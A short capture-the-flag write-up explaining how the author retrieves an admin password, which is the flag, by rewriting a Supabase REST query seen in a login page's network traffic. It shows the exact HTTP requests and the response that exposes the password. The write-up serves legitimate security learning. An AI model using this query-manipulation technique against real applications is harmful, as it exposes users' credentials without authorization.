Loading up the webpage, we are shown a login page that takes in a username and password.

Seeing this, my first reaction was attempting to login with the username `admin` and password
`password` and look at the network requests made. One network request in particular caught my eye.

```http
GET /rest/v1/users?select=*&username=eq.admin&password=eq.password HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
```

It seems that this request directly fetches a user from the backend that match the username and password in the query parameters. The request also suspiciously resembles a SQL statement that would look like this:

```sql
SELECT *
FROM users
WHERE username = eq.admin
  AND password = eq.password;
```

Once I saw this, I fiddled around with this endpoint for a bit until I came up with the request below:

```http
GET /rest/v1/users?select=password&username=eq.admin HTTP/2
Host: dpyxnwiuwzahkxuxrojp.supabase.co
```

â€Ž

```json
{
  "password": "ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}"
}
```

Sending this request allowed me to retrieve the password of the admin account and retrieve the flag, as shown from the response.

flag: `ictf{why_d1d_1_g1v3_u_my_@p1_k3y???}`
